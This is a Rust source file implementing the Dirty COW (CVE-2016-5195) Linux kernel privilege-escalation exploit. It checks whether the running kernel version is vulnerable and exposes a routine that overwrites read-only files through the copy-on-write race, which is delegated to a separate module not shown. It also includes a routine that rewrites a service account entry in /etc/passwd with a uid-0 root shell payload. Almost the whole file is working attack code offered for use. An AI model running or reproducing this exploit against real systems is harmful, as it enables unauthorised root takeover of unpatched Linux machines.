//! CVE-2016-5195: Dirty COW (Copy-On-Write Race Condition)
//!
//! Race condition in mm/gup.c allows writing to read-only mappings.
//! Target: Linux Kernel 2.6.22 - 4.8 (2007-2016)
//!
//! Mechanism:
//! 1. Map target file read-only with MAP_PRIVATE
//! 2. Thread A: Continuously write via /proc/self/mem
//! 3. Thread B: Continuously call madvise(MADV_DONTNEED)
//! 4. Race: madvise discards COW page, write goes to original
//!
//! This exploit is probabilistic - success depends on winning the race.

mod race;

use log::{info, error, warn};

pub struct Exploit {
    kernel: (u32, u32, u32),
}

impl Exploit {
    pub fn new() -> Self {
        Self { kernel: Self::get_kernel_version() }
    }

    fn get_kernel_version() -> (u32, u32, u32) {
        let mut u: libc::utsname = unsafe { std::mem::zeroed() };
        unsafe { libc::uname(&mut u) };
        
        let r = unsafe { std::ffi::CStr::from_ptr(u.release.as_ptr()) }
            .to_str().unwrap_or("0.0.0");
        
        let p: Vec<u32> = r.split(|c: char| !c.is_ascii_digit())
            .take(3)
            .filter_map(|s| s.parse().ok())
            .collect();
        
        (p.get(0).copied().unwrap_or(0),
         p.get(1).copied().unwrap_or(0),
         p.get(2).copied().unwrap_or(0))
    }

    fn is_vulnerable(&self) -> bool {
        let (maj, min, patch) = self.kernel;
        
        // Dirty COW: CVE-2016-5195
        // Vulnerable: 2.6.22 <= kernel < fixed versions
        // Fixed in mainline: 4.8.3, 4.7.9, 4.4.26
        // Also backported to: 3.18.44, 3.10.104, 3.4.113, 3.2.82
        
        if maj < 2 { return false; }
        
        // Kernel 2.x: vulnerable from 2.6.22
        if maj == 2 {
            if min < 6 { return false; }
            if min == 6 && patch < 22 { return false; }
            return true; // 2.6.22+ vulnerable
        }
        
        // Kernel 3.x: check for backported fixes
        if maj == 3 {
            if min == 2 && patch >= 82 { return false; }   // 3.2.82+ fixed
            if min == 4 && patch >= 113 { return false; }  // 3.4.113+ fixed
            if min == 10 && patch >= 104 { return false; } // 3.10.104+ fixed
            if min == 18 && patch >= 44 { return false; }  // 3.18.44+ fixed
            return true; // Other 3.x vulnerable
        }
        
        // Kernel 4.x: check all fix points
        if maj == 4 {
            if min < 4 { return true; } // 4.0-4.3 vulnerable
            if min == 4 && patch < 26 { return true; }  // 4.4.0-4.4.25 vulnerable
            if min == 4 && patch >= 26 { return false; } // 4.4.26+ fixed
            if min >= 5 && min < 7 { return true; } // 4.5, 4.6 vulnerable
            if min == 7 && patch < 9 { return true; }   // 4.7.0-4.7.8 vulnerable
            if min == 7 && patch >= 9 { return false; } // 4.7.9+ fixed
            if min == 8 && patch < 3 { return true; }   // 4.8.0-4.8.2 vulnerable
            return false; // 4.8.3+ and 4.9+ fixed
        }
        
        false // 5.x+ not vulnerable
    }

    /// Overwrite arbitrary read-only file content
    pub fn overwrite_file(&self, target: &str, offset: usize, data: &[u8]) -> Result<(), String> {
        info!("[DirtyCOW] Kernel {}.{}.{}", self.kernel.0, self.kernel.1, self.kernel.2);

        if !self.is_vulnerable() {
            return Err(format!("Not vulnerable (need < 4.8.3, have {}.{}.{})",
                self.kernel.0, self.kernel.1, self.kernel.2));
        }

        race::execute(target, offset, data)
    }

    /// Convenience: Overwrite /etc/passwd to gain root  
    pub fn escalate_via_passwd(&self) -> Result<(), String> {
        // Strategy: Find and overwrite a service account line
        let passwd = std::fs::read_to_string("/etc/passwd")
            .map_err(|e| format!("Read passwd: {}", e))?;

        // Find a suitable target (games, news, proxy, etc.)
        for target in ["games:", "news:", "proxy:", "backup:", "list:"] {
            if let Some(pos) = passwd.find(target) {
                let line_end = passwd[pos..].find('\n').map(|i| pos + i).unwrap_or(passwd.len());
                let line_len = line_end - pos;
                let prefix_len = target.len();
                
                // Payload: x:0:0::/root:/bin/sh (gives uid 0)
                let payload = b"x:0:0::/root:/bin/sh";
                
                if prefix_len + payload.len() < line_len {
                    let offset = pos + prefix_len;
                    info!("[DirtyCOW] Overwriting {} at offset {}", target, offset);
                    return self.overwrite_file("/etc/passwd", offset, payload);
                }
            }
        }

        Err("No suitable target found in /etc/passwd".into())
    }

    pub fn run(&self) -> Result<(), String> {
        info!("[DirtyCOW] CVE-2016-5195 Privilege Escalation");
        self.escalate_via_passwd()
    }
}
